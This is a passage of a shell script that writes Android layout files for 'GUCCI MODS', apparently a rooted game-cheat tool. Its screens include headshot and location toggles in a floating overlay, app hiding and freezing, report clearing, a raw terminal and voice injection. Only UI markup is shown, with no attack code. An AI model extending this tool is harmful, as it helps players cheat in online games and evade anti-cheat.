<com.google.android.material.card.MaterialCardView android:layout_width="match_parent" android:layout_height="wrap_content" app:cardBackgroundColor="@color/card_bg" app:cardCornerRadius="16dp" android:layout_marginBottom="16dp">
<LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="vertical" android:padding="16dp">
<TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="Execution Mode" android:textColor="@color/accent_green" android:textStyle="bold" android:layout_marginBottom="8dp"/>
<RadioGroup android:id="@+id/modeGroup" android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal" android:layout_marginBottom="16dp">
<RadioButton android:id="@+id/radioRoot" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="Root Mode" android:textColor="@color/text_primary" android:checked="true"/>
<RadioButton android:id="@+id/radioShizuku" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="ADB (Shizuku)" android:textColor="@color/text_primary" android:layout_marginStart="16dp"/>
</RadioGroup>
<TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="App Control" android:textColor="@color/accent_green" android:textStyle="bold" android:layout_marginBottom="8dp"/>
<EditText android:id="@+id/pkgInput" android:layout_width="match_parent" android:layout_height="48dp" android:hint="Enter Package Name..." android:background="@drawable/bg_box_dark" android:padding="12dp" android:textColor="@color/text_primary" android:textColorHint="@color/text_secondary" android:layout_marginBottom="12dp"/>
<LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal" android:layout_marginBottom="8dp">
<com.google.android.material.button.MaterialButton android:id="@+id/btnHide" android:layout_width="0dp" android:layout_weight="1" android:layout_height="48dp" android:text="HIDE" app:backgroundTint="@color/accent_red" android:textColor="#FFFFFF" android:textStyle="bold" android:layout_marginEnd="8dp"/>
<com.google.android.material.button.MaterialButton android:id="@+id/btnUnhide" android:layout_width="0dp" android:layout_weight="1" android:layout_height="48dp" android:text="UNHIDE" app:backgroundTint="@color/accent_green" android:textColor="#000000" android:textStyle="bold"/>
</LinearLayout>
<LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal" android:layout_marginBottom="8dp">
<com.google.android.material.button.MaterialButton android:id="@+id/btnFreeze" android:layout_width="0dp" android:layout_weight="1" android:layout_height="48dp" android:text="FREEZE" app:backgroundTint="#F39C12" android:textColor="#FFFFFF" android:textStyle="bold" android:layout_marginEnd="8dp"/>
<com.google.android.material.button.MaterialButton android:id="@+id/btnDeepFreeze" android:layout_width="0dp" android:layout_weight="1" android:layout_height="48dp" android:text="DEEP FREEZE" app:backgroundTint="#8E44AD" android:textColor="#FFFFFF" android:textStyle="bold"/>
</LinearLayout>
<LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal">
<com.google.android.material.button.MaterialButton android:id="@+id/btnUnfreeze" android:layout_width="0dp" android:layout_weight="1" android:layout_height="48dp" android:text="UNFREEZE" app:backgroundTint="#2ECC71" android:textColor="#FFFFFF" android:textStyle="bold" android:layout_marginEnd="8dp"/>
<com.google.android.material.button.MaterialButton android:id="@+id/btnDelete" android:layout_width="0dp" android:layout_weight="1" android:layout_height="48dp" android:text="DELETE" app:backgroundTint="#E74C3C" android:textColor="#FFFFFF" android:textStyle="bold"/>
</LinearLayout>
</LinearLayout>
</com.google.android.material.card.MaterialCardView>
<com.google.android.material.card.MaterialCardView android:layout_width="match_parent" android:layout_height="0dp" android:layout_weight="1" app:cardBackgroundColor="@color/card_bg" app:cardCornerRadius="16dp" android:layout_marginBottom="16dp">
<LinearLayout android:layout_width="match_parent" android:layout_height="match_parent" android:orientation="vertical" android:padding="16dp">
<TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="Raw Terminal" android:textColor="@color/accent_green" android:textStyle="bold" android:layout_marginBottom="8dp"/>
<LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal" android:layout_marginBottom="8dp">
<EditText android:id="@+id/terminalInput" android:layout_width="0dp" android:layout_weight="1" android:layout_height="48dp" android:hint="Enter command..." android:background="@drawable/bg_box_dark" android:padding="12dp" android:textColor="@color/text_primary" android:textColorHint="@color/text_secondary" android:layout_marginEnd="8dp" android:inputType="textNoSuggestions"/>
<com.google.android.material.button.MaterialButton android:id="@+id/btnRunCmd" android:layout_width="wrap_content" android:layout_height="48dp" android:text="RUN" app:backgroundTint="@color/accent_green" android:textColor="#000000" android:textStyle="bold"/>
</LinearLayout>
<ScrollView android:layout_width="match_parent" android:layout_height="0dp" android:layout_weight="1" android:background="@drawable/bg_box_dark" android:padding="12dp">
<TextView android:id="@+id/terminalOutput" android:layout_width="match_parent" android:layout_height="wrap_content" android:textColor="#00FF00" android:fontFamily="monospace" android:textSize="12sp" android:text="Terminal Ready...\n"/>
</ScrollView>
</LinearLayout>
</com.google.android.material.card.MaterialCardView>
</LinearLayout>
EOF

cat > app/src/main/res/layout/activity_hide_apps.xml << 'EOF'
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto" android:layout_width="match_parent" android:layout_height="match_parent" android:orientation="vertical" android:background="@color/bg_main" android:padding="16dp">
<com.google.android.material.tabs.TabLayout android:id="@+id/tabLayout" android:layout_width="match_parent" android:layout_height="wrap_content" app:tabIndicatorColor="@color/accent_green" app:tabTextColor="@color/text_secondary" app:tabSelectedTextColor="@color/text_primary" app:tabIndicatorFullWidth="true" android:layout_marginBottom="16dp">
<com.google.android.material.tabs.TabItem android:text="Manage Apps" /><com.google.android.material.tabs.TabItem android:text="Hidden &amp; Emergency" />
</com.google.android.material.tabs.TabLayout>
<FrameLayout android:layout_width="match_parent" android:layout_height="0dp" android:layout_weight="1">
<LinearLayout android:id="@+id/pageAllApps" android:layout_width="match_parent" android:layout_height="match_parent" android:orientation="vertical" android:visibility="visible">
<com.google.android.material.textfield.TextInputLayout style="@style/Widget.MaterialComponents.TextInputLayout.OutlinedBox" android:layout_width="match_parent" android:layout_height="wrap_content" app:boxStrokeColor="@color/accent_green" app:hintTextColor="@color/accent_green" android:layout_marginBottom="12dp">
<com.google.android.material.textfield.TextInputEditText android:id="@+id/searchInput" android:layout_width="match_parent" android:layout_height="wrap_content" android:hint="Search all apps..." android:textColor="@color/text_primary" android:textColorHint="@color/text_secondary" android:inputType="text"/>
</com.google.android.material.textfield.TextInputLayout>
<ListView android:id="@+id/appsList" android:layout_width="match_parent" android:layout_height="0dp" android:layout_weight="1" android:divider="@null" android:dividerHeight="0dp"/>
<LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal" android:layout_marginTop="12dp" android:gravity="center_vertical" android:background="@drawable/bg_box_dark" android:padding="12dp">
<TextView android:layout_width="0dp" android:layout_weight="1" android:layout_height="wrap_content" android:text="Show System Apps" android:textColor="@color/accent_green" android:textSize="14sp" android:textStyle="bold"/>
<com.google.android.material.materialswitch.MaterialSwitch android:id="@+id/showSystemSwitch" android:layout_width="wrap_content" android:layout_height="wrap_content"/>
</LinearLayout>
<LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal" android:layout_marginTop="8dp" android:gravity="center_vertical" android:background="@drawable/bg_box_dark" android:padding="12dp">
<TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="Auto-Unhide Timer: " android:textColor="@color/accent_green" android:textSize="14sp" android:textStyle="bold"/>
<Spinner android:id="@+id/timerSpinner" android:layout_width="match_parent" android:layout_height="40dp" android:backgroundTint="@color/accent_green"/>
</LinearLayout>
</LinearLayout>
<LinearLayout android:id="@+id/pageHiddenApps" android:layout_width="match_parent" android:layout_height="match_parent" android:orientation="vertical" android:visibility="gone">
<com.google.android.material.button.MaterialButton android:id="@+id/emergencyBtn" style="@style/Widget.MaterialComponents.Button.OutlinedButton" android:layout_width="match_parent" android:layout_height="56dp" android:text="🚨 EMERGENCY UNHIDE ALL" app:strokeColor="@color/accent_red" android:textColor="@color/accent_red" android:textSize="14sp" app:cornerRadius="16dp" android:layout_marginBottom="16dp" android:textStyle="bold"/>
<ListView android:id="@+id/hiddenAppsList" android:layout_width="match_parent" android:layout_height="0dp" android:layout_weight="1" android:divider="@null" android:dividerHeight="0dp"/>
</LinearLayout>
</FrameLayout>
<com.google.android.material.button.MaterialButton android:id="@+id/applyBtn" android:layout_width="match_parent" android:layout_height="60dp" android:layout_marginTop="16dp" android:text="APPLY FOR TILE" android:textColor="#000000" app:backgroundTint="@color/accent_green" app:cornerRadius="16dp" android:textStyle="bold"/>
</LinearLayout>
EOF

cat > app/src/main/res/layout/activity_clear_report.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto" android:layout_width="match_parent" android:layout_height="match_parent" android:orientation="vertical" android:background="@color/bg_main" android:padding="24dp" android:gravity="center_vertical">
<TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="REPORT MANAGER" android:textColor="@color/text_primary" android:textSize="28sp" android:textStyle="bold" android:layout_gravity="center_horizontal" android:layout_marginBottom="8dp"/>
<TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="Clean up game files and reports" android:textColor="@color/text_secondary" android:textSize="14sp" android:layout_gravity="center_horizontal" android:layout_marginBottom="32dp"/>
<com.google.android.material.card.MaterialCardView android:layout_width="match_parent" android:layout_height="wrap_content" app:cardBackgroundColor="@color/card_bg" app:cardCornerRadius="16dp" android:layout_marginBottom="24dp">
<LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="vertical" android:padding="20dp">
<TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="CLEAR REPORT" android:textColor="#2ECC71" android:textSize="20sp" android:textStyle="bold"/>
<TextView android:layout_width="match_parent" android:layout_height="wrap_content" android:text="✅ Safe: Only deletes cache and logs.\nIt is safe and no data wipe of your game settings or accounts." android:textColor="@color/text_secondary" android:textSize="13sp" android:layout_marginTop="4dp" android:layout_marginBottom="16dp"/>
<com.google.android.material.button.MaterialButton android:id="@+id/btnSafeClear" android:layout_width="match_parent" android:layout_height="56dp" android:text="CLEAR REPORT SAFELY" android:textColor="#000000" app:backgroundTint="#2ECC71" app:cornerRadius="12dp" android:textStyle="bold"/>
</LinearLayout>
</com.google.android.material.card.MaterialCardView>
<com.google.android.material.card.MaterialCardView android:layout_width="match_parent" android:layout_height="wrap_content" app:cardBackgroundColor="@color/card_bg" app:cardCornerRadius="16dp">
<LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="vertical" android:padding="20dp">
<TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="CLEAR REPORT DEEPLY" android:textColor="#FF4D4D" android:textSize="20sp" android:textStyle="bold"/>
<TextView android:layout_width="match_parent" android:layout_height="wrap_content" android:text="⚠️ RISKY: Deletes the entire files folder.\nWarning: It may delete your settings or game data permanently." android:textColor="#FF4D4D" android:textSize="13sp" android:layout_marginTop="4dp" android:layout_marginBottom="16dp"/>
<com.google.android.material.button.MaterialButton android:id="@+id/btnDeepClear" android:layout_width="match_parent" android:layout_height="64dp" android:text="⚠️ CLEAR REPORT DEEPLY" android:textColor="#FFFFFF" app:backgroundTint="#FF4D4D" app:cornerRadius="12dp" android:textStyle="bold" android:textSize="16sp"/>
</LinearLayout>
</com.google.android.material.card.MaterialCardView>
</LinearLayout>
EOF

cat > app/src/main/res/layout/overlay_floater.xml << 'EOF'
<com.google.android.material.card.MaterialCardView xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto" android:layout_width="280dp" android:layout_height="wrap_content" app:cardBackgroundColor="#0B0F17" app:cardCornerRadius="20dp" app:cardElevation="15dp" app:strokeColor="#1F2633" app:strokeWidth="1dp">
<LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="vertical" android:padding="12dp">
<LinearLayout android:id="@+id/dragHandleTop" android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal" android:gravity="center_vertical" android:layout_marginBottom="8dp">
<TextView android:layout_width="0dp" android:layout_weight="1" android:layout_height="wrap_content" android:text="GUCCI MODS" android:textColor="#FFFFFF" android:textStyle="bold" android:textSize="14sp" android:fontFamily="sans-serif-black" android:letterSpacing="0.05"/>
<ImageButton android:id="@+id/btnMinimize" android:layout_width="28dp" android:layout_height="28dp" android:padding="4dp" android:background="@drawable/bg_circle_grey" android:src="@drawable/ic_minimize" app:tint="#8B949E" android:layout_marginEnd="8dp"/>
<ImageButton android:id="@+id/btnClose" android:layout_width="28dp" android:layout_height="28dp" android:padding="4dp" android:background="@drawable/bg_circle_grey" android:src="@drawable/ic_close" app:tint="#FF4D4D"/>
</LinearLayout>
<LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal" android:gravity="center_vertical" android:layout_marginBottom="8dp">
<TextView android:layout_width="0dp" android:layout_weight="1" android:layout_height="wrap_content" android:text="STATUS" android:textColor="#8B949E" android:textSize="10sp" android:textStyle="bold" android:letterSpacing="0.1"/>
<TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="READY" android:textColor="#00E5A0" android:textSize="10sp" android:textStyle="bold" android:letterSpacing="0.1"/>
</LinearLayout>
<View android:layout_width="match_parent" android:layout_height="1dp" android:background="#1F2633" android:layout_marginBottom="8dp"/>
<ScrollView android:layout_width="match_parent" android:layout_height="wrap_content" android:maxHeight="240dp" android:scrollbars="none">
<LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="vertical">
<LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal" android:gravity="center_vertical" android:layout_marginBottom="6dp" android:background="#12161F" android:padding="6dp" android:layout_marginEnd="4dp">
<TextView android:layout_width="0dp" android:layout_weight="1" android:layout_height="wrap_content" android:text="GUCCI DETECTOR" android:textColor="#FFFFFF" android:textSize="12sp" android:textStyle="bold"/>
<com.google.android.material.materialswitch.MaterialSwitch android:id="@+id/switchFloater1" android:layout_width="wrap_content" android:layout_height="wrap_content" app:thumbTint="#8B949E" app:trackTint="#1F2633"/>
</LinearLayout>
<LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal" android:gravity="center_vertical" android:layout_marginBottom="6dp" android:background="#12161F" android:padding="6dp" android:layout_marginEnd="4dp">
<TextView android:layout_width="0dp" android:layout_weight="1" android:layout_height="wrap_content" android:text="GUCCI HS" android:textColor="#FFFFFF" android:textSize="12sp" android:textStyle="bold"/>
<com.google.android.material.materialswitch.MaterialSwitch android:id="@+id/switchFloater2" android:layout_width="wrap_content" android:layout_height="wrap_content" app:thumbTint="#8B949E" app:trackTint="#1F2633"/>
</LinearLayout>
<LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal" android:gravity="center_vertical" android:layout_marginBottom="6dp" android:background="#12161F" android:padding="6dp" android:layout_marginEnd="4dp">
<TextView android:layout_width="0dp" android:layout_weight="1" android:layout_height="wrap_content" android:text="GLOO CROSS" android:textColor="#FFFFFF" android:textSize="12sp" android:textStyle="bold"/>
<com.google.android.material.materialswitch.MaterialSwitch android:id="@+id/switchFloater3" android:layout_width="wrap_content" android:layout_height="wrap_content" app:thumbTint="#8B949E" app:trackTint="#1F2633"/>
</LinearLayout>
<LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal" android:gravity="center_vertical" android:layout_marginBottom="6dp" android:background="#12161F" android:padding="6dp" android:layout_marginEnd="4dp">
<TextView android:layout_width="0dp" android:layout_weight="1" android:layout_height="wrap_content" android:text="CHEST HS" android:textColor="#FFFFFF" android:textSize="12sp" android:textStyle="bold"/>
<com.google.android.material.materialswitch.MaterialSwitch android:id="@+id/switchFloater4" android:layout_width="wrap_content" android:layout_height="wrap_content" app:thumbTint="#8B949E" app:trackTint="#1F2633"/>
</LinearLayout>
<LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="vertical" android:layout_marginBottom="6dp" android:background="#12161F" android:padding="6dp" android:layout_marginEnd="4dp">
<LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal" android:gravity="center_vertical">
<TextView android:layout_width="0dp" android:layout_weight="1" android:layout_height="wrap_content" android:text="BODY HS" android:textColor="#FFFFFF" android:textSize="12sp" android:textStyle="bold"/>
<com.google.android.material.materialswitch.MaterialSwitch android:id="@+id/switchFloater5" android:layout_width="wrap_content" android:layout_height="wrap_content" app:thumbTint="#8B949E" app:trackTint="#1F2633"/>
</LinearLayout>
<TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="⚠️ Use only In Custom" android:textColor="#FF4D4D" android:textSize="9sp" android:textStyle="bold"/>
</LinearLayout>
<LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal" android:gravity="center_vertical" android:layout_marginBottom="6dp" android:background="#12161F" android:padding="6dp" android:layout_marginEnd="4dp">
<TextView android:layout_width="0dp" android:layout_weight="1" android:layout_height="wrap_content" android:text="MAGIC" android:textColor="#FFFFFF" android:textSize="12sp" android:textStyle="bold"/>
<com.google.android.material.materialswitch.MaterialSwitch android:id="@+id/switchFloater6" android:layout_width="wrap_content" android:layout_height="wrap_content" app:thumbTint="#8B949E" app:trackTint="#1F2633"/>
</LinearLayout>
<LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal" android:gravity="center_vertical" android:layout_marginBottom="4dp" android:background="#12161F" android:padding="6dp" android:layout_marginEnd="4dp">
<TextView android:layout_width="0dp" android:layout_weight="1" android:layout_height="wrap_content" android:text="LOCATION" android:textColor="#FFFFFF" android:textSize="12sp" android:textStyle="bold"/>
<com.google.android.material.materialswitch.MaterialSwitch android:id="@+id/switchFloater7" android:layout_width="wrap_content" android:layout_height="wrap_content" app:thumbTint="#8B949E" app:trackTint="#1F2633"/>
</LinearLayout>
</LinearLayout>
</ScrollView>
<View android:layout_width="match_parent" android:layout_height="1dp" android:background="#1F2633" android:layout_marginBottom="8dp" android:layout_marginTop="4dp"/>
<LinearLayout android:id="@+id/dragHandleBottom" android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal" android:gravity="center_vertical">
<TextView android:layout_width="0dp" android:layout_weight="1" android:layout_height="wrap_content" android:text="ROOT" android:textColor="#8B949E" android:textSize="10sp" android:textStyle="bold" android:letterSpacing="0.1"/>
<TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="GRANTED" android:textColor="#00E5A0" android:textSize="10sp" android:textStyle="bold" android:letterSpacing="0.1"/>
</LinearLayout>
</LinearLayout>
</com.google.android.material.card.MaterialCardView>
EOF

cat > app/src/main/res/layout/overlay_bubble.xml << 'EOF'
<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto" android:layout_width="60dp" android:layout_height="60dp" android:background="@drawable/bg_circle_grey">
<ImageView android:layout_width="match_parent" android:layout_height="match_parent" android:padding="12dp" android:src="@drawable/ic_tile_floater" app:tint="@color/accent_green"/>
</FrameLayout>
EOF

cat > app/src/main/res/layout/activity_gucci_voice.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<ScrollView xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto" android:layout_width="match_parent" android:layout_height="match_parent" android:background="#07090C" android:fillViewport="true">
<LinearLayout android:orientation="vertical" android:padding="16dp" android:layout_width="match_parent" android:layout_height="wrap_content">
    <LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal" android:gravity="center_vertical" android:layout_marginBottom="16dp">
        <ImageView android:layout_width="50dp" android:layout_height="50dp" android:src="@drawable/ic_app_icon" android:layout_marginEnd="12dp"/>
        <LinearLayout android:layout_width="0dp" android:layout_weight="1" android:layout_height="wrap_content" android:orientation="vertical">
            <TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="GUCCI VOICES" android:textColor="#4FC3F7" android:textSize="22sp" android:textStyle="bold" android:fontFamily="sans-serif-black" android:fontStyle="italic"/>
            <TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="👑 Gaming Voice Soundboard" android:textColor="#8B949E" android:textSize="12sp"/>
        </LinearLayout>
    </LinearLayout>
    <com.google.android.material.button.MaterialButton android:id="@+id/btnTurnOverlayOn" android:layout_width="match_parent" android:layout_height="55dp" android:text="🎮 Turn overlay on" android:textColor="#000000" app:backgroundTint="#00E5A0" app:cornerRadius="12dp" android:textStyle="bold" android:layout_marginBottom="12dp"/>
    <LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal" android:layout_marginBottom="16dp">
        <com.google.android.material.button.MaterialButton android:id="@+id/btnMaxVolume" android:layout_width="0dp" android:layout_weight="1" android:layout_height="50dp" android:text="🔊 Max volume" android:textColor="#FFFFFF" app:backgroundTint="#8B5CF6" app:cornerRadius="12dp" android:layout_marginEnd="8dp"/>
        <com.google.android.material.button.MaterialButton android:id="@+id/btnStopAll" android:layout_width="0dp" android:layout_weight="1" android:layout_height="50dp" android:text="⏹️ Stop all" android:textColor="#FFFFFF" app:backgroundTint="#EF4444" app:cornerRadius="12dp"/>
    </LinearLayout>
    <com.google.android.material.card.MaterialCardView android:layout_width="match_parent" android:layout_height="wrap_content" app:cardBackgroundColor="#0A1120" app:cardCornerRadius="16dp" app:strokeColor="#1F4E79" app:strokeWidth="1dp" android:layout_marginBottom="16dp">
        <LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="vertical" android:padding="16dp">
            <TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="🗣️ Text → Voice" android:textColor="#FFFFFF" android:textStyle="bold" android:layout_marginBottom="12dp"/>
            <EditText android:id="@+id/etVoiceText" android:layout_width="match_parent" android:layout_height="80dp" android:gravity="top|start" android:hint="Type here..." android:textColor="#FFFFFF" android:textColorHint="#8B949E" android:background="#12161F" android:padding="10dp" android:layout_marginBottom="12dp"/>
            <LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal">
                <com.google.android.material.button.MaterialButton android:id="@+id/btnPlayText" android:layout_width="0dp" android:layout_weight="1" android:layout_height="45dp" android:text="▶️ Play" android:textColor="#000000" app:backgroundTint="#00E5A0" app:cornerRadius="8dp" android:textStyle="bold" android:layout_marginEnd="8dp"/>
                <com.google.android.material.button.MaterialButton android:id="@+id/btnSaveText" android:layout_width="0dp" android:layout_weight="1" android:layout_height="45dp" android:text="💾 Save to Cards" android:textColor="#FFFFFF" app:backgroundTint="#8B5CF6" app:cornerRadius="8dp" android:textStyle="bold"/>
            </LinearLayout>
        </LinearLayout>
    </com.google.android.material.card.MaterialCardView>
    <LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal" android:gravity="center_vertical" android:layout_marginBottom="12dp">
        <TextView android:id="@+id/tvVoiceCount" android:layout_width="0dp" android:layout_weight="1" android:layout_height="wrap_content" android:text="🎧 My voices (0)" android:textColor="#FFFFFF" android:textSize="18sp" android:textStyle="bold"/>
        <com.google.android.material.button.MaterialButton android:id="@+id/btnAddVoice" android:layout_width="wrap_content" android:layout_height="40dp" android:text="+ Add voice" android:textColor="#FFFFFF" app:backgroundTint="#8B5CF6" app:cornerRadius="8dp" android:textSize="12sp"/>
        <com.google.android.material.button.MaterialButton android:id="@+id/btnExtractVideo" android:layout_width="wrap_content" android:layout_height="40dp" android:text="🎬 Video" android:textColor="#FFFFFF" app:backgroundTint="#3B82F6" app:cornerRadius="8dp" android:textSize="12sp" android:layout_marginStart="4dp"/>
    </LinearLayout>
    <GridView android:id="@+id/gridVoices" android:layout_width="match_parent" android:layout_height="wrap_content" android:numColumns="2" android:verticalSpacing="12dp" android:horizontalSpacing="12dp"/>
</LinearLayout>
</ScrollView>
EOF

cat > app/src/main/res/layout/item_voice_card.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<com.google.android.material.card.MaterialCardView xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto" android:layout_width="match_parent" android:layout_height="140dp" app:cardBackgroundColor="#12161F" app:cardCornerRadius="16dp">
    <RelativeLayout android:layout_width="match_parent" android:layout_height="match_parent" android:padding="12dp">
        <ImageView android:id="@+id/btnDelete" android:layout_width="24dp" android:layout_height="24dp" android:src="@drawable/ic_close" app:tint="#8B949E" android:layout_alignParentTop="true" android:layout_alignParentEnd="true"/>
        <TextView android:id="@+id/tvLetter" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="A" android:textColor="#4FC3F7" android:textSize="36sp" android:textStyle="bold" android:layout_centerInParent="true"/>
        <TextView android:id="@+id/tvName" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="Name" android:textColor="#FFFFFF" android:textSize="11sp" android:maxLines="1" android:layout_alignParentBottom="true" android:layout_toStartOf="@+id/btnPlay"/>
        <ImageView android:id="@+id/btnPlay" android:layout_width="32dp" android:layout_height="32dp" android:src="@android:drawable/ic_media_play" app:tint="#00E5A0" android:layout_alignParentBottom="true" android:layout_alignParentEnd="true"/>
    </RelativeLayout>
</com.google.android.material.card.MaterialCardView>
EOF
cat > app/src/main/res/layout/overlay_gucci_voice.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<com.google.android.material.card.MaterialCardView xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto" android:layout_width="240dp" android:layout_height="wrap_content" app:cardBackgroundColor="#0A1120" app:cardCornerRadius="12dp" app:cardElevation="10dp" app:strokeColor="#1F4E79" app:strokeWidth="1dp">
<LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="vertical" android:padding="8dp">
    <LinearLayout android:id="@+id/dragHandleTop" android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal" android:gravity="center_vertical" android:layout_marginBottom="6dp">
        <TextView android:layout_width="0dp" android:layout_weight="1" android:layout_height="wrap_content" android:text="👑 GUCCI VOICES" android:textColor="#4FC3F7" android:textStyle="bold" android:textSize="11sp" android:fontFamily="sans-serif-black"/>
        <ImageButton android:id="@+id/btnMinimize" android:layout_width="20dp" android:layout_height="20dp" android:padding="2dp" android:background="@drawable/bg_circle_grey" android:src="@drawable/ic_minimize" app:tint="#8B949E" android:layout_marginEnd="4dp"/>
        <ImageButton android:id="@+id/btnClose" android:layout_width="20dp" android:layout_height="20dp" android:padding="2dp" android:background="@drawable/bg_circle_grey" android:src="@drawable/ic_close" app:tint="#FF4D4D"/>
    </LinearLayout>
    
    <LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal" android:gravity="center_vertical" android:background="#12161F" android:padding="4dp" android:layout_marginBottom="6dp">
        <TextView android:layout_width="0dp" android:layout_weight="1" android:layout_height="wrap_content" android:text="INJECT GUCCI VOICES" android:textColor="#00E5A0" android:textSize="9sp" android:textStyle="bold"/>
        <com.google.android.material.materialswitch.MaterialSwitch android:id="@+id/swInject" android:layout_width="wrap_content" android:layout_height="wrap_content" android:checked="false"/>
    </LinearLayout>
    
    <TextView android:id="@+id/tvCopyMixer" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="⚠️ Routing failed. Tap here to copy Mixer Log." android:textColor="#FF4D4D" android:textSize="9sp" android:textStyle="bold" android:gravity="center" android:padding="4dp" android:visibility="gone"/>
    
    <LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal" android:layout_marginBottom="6dp">
        <LinearLayout android:id="@+id/tabCards" android:layout_width="0dp" android:layout_weight="1" android:layout_height="28dp" android:gravity="center" android:background="@drawable/bg_box_dark" android:layout_marginEnd="2dp">
            <TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="🎵" android:textColor="#FFFFFF" android:textSize="10sp" android:textStyle="bold"/>
        </LinearLayout>
        <LinearLayout android:id="@+id/tabType" android:layout_width="0dp" android:layout_weight="1" android:layout_height="28dp" android:gravity="center" android:background="@drawable/bg_box_dark" android:layout_marginEnd="2dp">
            <TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="💬" android:textColor="#FFFFFF" android:textSize="10sp" android:textStyle="bold"/>
        </LinearLayout>
        <LinearLayout android:id="@+id/tabLive" android:layout_width="0dp" android:layout_weight="1" android:layout_height="28dp" android:gravity="center" android:background="#12161F">
            <TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="🔴" android:textColor="#FFFFFF" android:textSize="10sp" android:textStyle="bold"/>
        </LinearLayout>
    </LinearLayout>
    
    <LinearLayout android:id="@+id/pageCards" android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="vertical" android:visibility="visible">
        <GridView android:id="@+id/lvVoicesFloater" android:layout_width="match_parent" android:layout_height="130dp" android:numColumns="3" android:verticalSpacing="2dp" android:horizontalSpacing="2dp"/>
        <ProgressBar android:id="@+id/pbPlayback" style="?android:attr/progressBarStyleHorizontal" android:layout_width="match_parent" android:layout_height="3dp" android:layout_marginTop="2dp" android:layout_marginBottom="2dp" android:progressTint="#00E5A0" android:visibility="invisible"/>
        <LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal">
            <com.google.android.material.button.MaterialButton android:id="@+id/btnOverlayRefresh" android:layout_width="0dp" android:layout_weight="1" android:layout_height="26dp" android:text="REFRESH" android:textColor="#000000" app:backgroundTint="#3B82F6" app:cornerRadius="4dp" android:textSize="8sp" android:layout_marginEnd="2dp" android:insetTop="0dp" android:insetBottom="0dp"/>
